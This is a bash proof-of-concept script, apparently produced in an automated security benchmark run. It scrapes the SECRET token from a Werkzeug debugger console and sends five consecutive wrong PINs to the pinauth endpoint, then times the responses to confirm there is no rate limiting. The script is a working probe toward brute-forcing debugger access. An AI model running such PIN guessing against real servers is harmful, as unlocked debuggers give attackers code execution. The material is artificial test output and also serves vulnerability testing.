#!/bin/bash
# POC: Demonstrates missing rate limiting on Werkzeug debugger PIN authentication attempts. Sends multiple consecutive wrong PIN attempts to /console endpoint and verifies no rate limiting is enforced.
# Target: ./repo
# Created: 2025-12-02T16:23:40.810Z
# Session: benchmark-XBEN-093-24-miorxjqr

# Werkzeug Debugger PIN Rate Limiting POC
# This script demonstrates the lack of rate limiting on PIN authentication attempts
# on the Werkzeug debugger console endpoint.

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5003}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Testing Rate Limiting on Werkzeug Debugger PIN Authentication"
echo "[*] Target: $BASE_URL"
echo ""

# First, we need to get a valid session and SECRET token
# The console typically requires accessing /console first to get the page with SECRET
echo "[*] Step 1: Accessing /console endpoint to gather information..."
CONSOLE_PAGE=$(curl -s -c /tmp/cookies.txt "$BASE_URL/console" 2>/dev/null)

# Check if we can access the console
if echo "$CONSOLE_PAGE" | grep -q "Werkzeug"; then
    echo "[+] Werkzeug debugger console is accessible"
else
    echo "[-] Could not access Werkzeug console, trying alternative approach..."
fi

# Extract SECRET from the console page if available
SECRET=$(echo "$CONSOLE_PAGE" | grep -oP "name=\"s\" value=\"\K[^\"]*" | head -1)

if [ -z "$SECRET" ]; then
    echo "[!] SECRET token not found in initial request, using empty value"
    SECRET=""
fi

echo "[+] Using SECRET: ${SECRET:-(empty)}"
echo ""

# Step 2: Send multiple consecutive wrong PIN attempts without delay
echo "[*] Step 2: Sending 5 consecutive wrong PIN authentication attempts..."
echo ""

WRONG_PINS=("000001" "000002" "000003" "000004" "000005")
RESPONSE_TIMES=()

for i in "${!WRONG_PINS[@]}"; do
    PIN="${WRONG_PINS[$i]}"
    ATTEMPT=$((i + 1))
    
    echo "[*] Attempt $ATTEMPT: Sending wrong PIN $PIN"
    
    # Record start time
    START_TIME=$(date +%s%N)
    
    # Send PIN authentication request
    # Try different endpoint variations
    RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt -c /tmp/cookies.txt \
        "$BASE_URL/console?cmd=pinauth&pin=$PIN&s=$SECRET" 2>/dev/null)
    
    # Record end time
    END_TIME=$(date +%s%N)
    RESPONSE_TIME=$(( (END_TIME - START_TIME) / 1000000 ))
    RESPONSE_TIMES+=($RESPONSE_TIME)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -1)
    
    echo "    HTTP Code: $HTTP_CODE"
    echo "    Response Time: ${RESPONSE_TIME}ms"
    
    # Check for rate limiting indicators
    if echo "$BODY" | grep -qi "exhausted\|throttle\|rate limit\|locked\|too many\|wait"; then
        echo "    [!] Rate limiting detected in response!"
        echo "    Response snippet: $(echo "$BODY" | head -50)"
    else
        echo "    [+] No rate limiting in response"
    fi
    
    # Check for JSON response indicating success/failure
    if echo "$BODY" | grep -q "{"; then
        # Try to extract status from JSON
        STATUS=$(echo "$BODY" | grep -o '"status":"[^"]*' | head -1)
        EXHAUSTED=$(echo "$BODY" | grep -o '"exhausted":[^,}]*' | head -1)
        
        if [ -n "$STATUS" ]; then
            echo "    Status: $STATUS"
        fi
        if [ -n "$EXHAUSTED" ]; then
            echo "    Exhausted: $EXHAUSTED"
        fi
    fi
    
    echo ""
done

# Step 3: Analyze results
echo "[*] Step 3: Analyzing Response Times for Throttling Patterns"
echo ""

RESPONSE_TIME_STR="${RESPONSE_TIMES[@]}"
echo "Response times (ms): $RESPONSE_TIME_STR"

# Check if response times are consistent (indicating no artificial delays)
MIN_TIME=${RESPONSE_TIMES[0]}
MAX_TIME=${RESPONSE_TIMES[0]}

for time in "${RESPONSE_TIMES[@]}"; do
    if [ $time -lt $MIN_TIME ]; then
        MIN_TIME=$time
    fi
    if [ $time -gt $MAX_TIME ]; then
        MAX_TIME=$time
    fi
done

TIME_VARIANCE=$((MAX_TIME - MIN_TIME))

echo "Min response time: ${MIN_TIME}ms"
echo "Max response time: ${MAX_TIME}ms"
echo "Time variance: ${TIME_VARIANCE}ms"
echo ""

if [ $TIME_VARIANCE -lt 100 ]; then
    echo "[+] VULNERABILITY CONFIRMED: Consistent response times indicate NO exponential backoff"
    echo "[+] All 5 consecutive PIN attempts were processed at similar speeds"
    echo "[+] No rate limiting or account exhaustion protection detected"
    exit 0
else
    echo "[-] Response times vary significantly, possible throttling in place"
    exit 1
fi